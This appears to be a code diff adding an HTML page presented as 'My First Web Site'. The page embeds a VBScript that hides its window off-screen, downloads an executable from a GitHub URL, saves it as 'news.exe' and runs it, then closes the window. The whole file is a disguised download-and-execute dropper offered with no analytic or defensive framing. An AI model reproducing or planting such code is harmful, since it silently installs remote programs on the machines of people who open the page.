@@ -1,0 +1,27 @@
+<html>
+<head>
+<title>Welcome;)</title>
+<h1>My First Web Site</h1>
+</head>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+AutoOpen
+Sub AutoOpen()
+set WshShell = CreateObject("Wscript.Shell")
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://raw.githubusercontent.com/Raketa20022002/TestRepo/master/wifite.exe", False
+xHttp.Send
+With bStrm
+ .Type = 1 '//binary
+ .Open
+ .write xHttp.responseBody
+ .savetofile "news.exe", 2 '//overwrite
+End With
+WshShell.Run("news.exe")
+
+End Sub
+self.close
+</script>
+</html>
